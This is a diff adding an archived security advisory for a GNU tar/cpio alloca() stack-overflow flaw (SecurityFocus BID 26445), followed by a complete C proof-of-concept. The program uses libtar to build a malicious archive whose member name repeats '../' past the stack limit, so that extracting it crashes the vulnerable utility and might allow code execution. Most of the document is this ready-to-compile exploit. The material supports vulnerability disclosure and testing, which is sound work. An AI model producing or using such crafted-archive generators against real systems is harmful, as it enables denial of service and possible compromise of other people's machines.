@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/26445/info
+
+GNU's tar and cpio utilities are prone to a denial-of-service vulnerability because of insecure use of the 'alloca()' function.
+
+Successfully exploiting this issue allows attackers to crash the affected utilities and possibly to execute code, but this has not been confirmed.
+
+GNU tar and cpio utilities share the same vulnerable code and are both affected. Other utilities sharing this code may also be affected.
+
+/*
+ * paxlib's safer_name_suffix() stack overflow reproducer.
+ */
+
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <error.h>
+#include <fcntl.h>
+#include <sys/resource.h>
+#include <libtar.h>
+
+int main(int ac, const char *av[])
+{
+	struct rlimit r;
+	unsigned count, i;
+	char *s;
+	TAR *t;
+
+	if (ac != 2)
+		error(1, 0, "exactly two arguments expected");
+
+	if (getrlimit(RLIMIT_STACK, &r))
+		error(1, errno, "getrlimit RLIMIT_STACK");
+
+	count = r.rlim_cur / 3 + 1;
+	if (!(s = malloc(count * 3 + 1)))
+		error(1, errno, "malloc: %u", count * 3 + 1);
+
+	for (i = 0; i < count; ++i)
+		memcpy(s + i * 3, "../", 3);
+	s[count * 3] = '\0';
+
+	if (tar_open(&t, av[1], NULL, O_WRONLY|O_CREAT, 0644, TAR_GNU))
+		error(1, errno, "tar_open: %s", av[1]);
+
+	if (tar_append_file(t, "/dev/null", s))
+		error(1, errno, "tar_append_file: %s", av[1]);
+
+	if (tar_close(t))
+		error(1, errno, "tar_close");
+
+	return 0;
+}
